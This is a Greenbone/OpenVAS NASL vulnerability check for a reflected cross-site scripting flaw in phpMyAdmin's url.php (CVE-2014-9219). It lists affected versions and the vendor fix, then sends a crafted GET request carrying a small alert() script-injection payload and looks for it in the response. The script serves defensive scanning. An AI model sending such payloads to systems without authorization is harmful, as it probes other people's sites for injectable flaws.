CPE = "cpe:/a:phpmyadmin:phpmyadmin";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805306" );
	script_version( "$Revision: 11867 $" );
	script_cve_id( "CVE-2014-9219" );
	script_bugtraq_id( 71435 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2014-12-22 13:17:25 +0530 (Mon, 22 Dec 2014)" );
	script_name( "phpMyAdmin 'url.php' Cross Site Scripting Vulnerability - Dec14" );
	script_tag( name: "summary", value: "This host is installed with phpMyAdmin
  and is prone to cross-site scripting(XSS) vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Input passed via the 'url' parameter to
  url.php script is not validated before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "phpMyAdmin 4.2.x versions before 4.2.13.1" );
	script_tag( name: "solution", value: "Upgrade to phpMyAdmin 4.2.13.1 or later." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/99137" );
	script_xref( name: "URL", value: "http://www.phpmyadmin.net/home_page/security/PMASA-2014-18.php" );
	script_xref( name: "URL", value: "http://blog.elevenpaths.com/2014/12/phpmyadmin-fixes-xss-detected-by.html?m=1" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_phpmyadmin_detect_900129.sc" );
	script_mandatory_keys( "phpMyAdmin/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!phpPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: phpPort )){
	exit( 0 );
}
url = dir + "/url.php?url=http://" + get_host_name() + "/%27;alert(docume" + "nt.cookies);a=%27";
if(http_vuln_check( port: phpPort, url: url, check_header: TRUE, pattern: "';alert\\(document.cookies\\);a='.*</script>" )){
	security_message( phpPort );
	exit( 0 );
}

